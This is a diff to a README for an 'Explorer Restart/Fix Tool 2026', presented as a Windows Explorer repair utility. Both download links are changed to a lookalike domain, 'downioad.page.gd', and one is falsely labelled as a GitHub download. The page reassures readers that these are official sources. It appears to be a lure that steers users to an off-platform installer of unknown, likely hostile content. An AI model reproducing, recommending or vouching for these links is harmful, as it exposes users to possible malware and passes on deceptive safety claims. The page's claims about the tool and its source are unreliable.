@@ -2,7 +2,7 @@
 
 Explorer Restart/Fix Tool 2026 is a lightweight and efficient utility designed to quickly restart and fix Windows Explorer issues. It helps resolve common problems like Explorer crashing, freezing, or not responding, ensuring a smooth desktop experience for Windows 10 and Windows 11 users.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -72,7 +72,7 @@ Yes, the tool can be deployed in enterprise settings. However, we recommend test
 
 For the latest version of the Explorer Restart/Fix Tool, please visit the download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link will always point to the most recent stable release. We advise downloading only from official sources to avoid tampered files and ensure a secure experience.
 
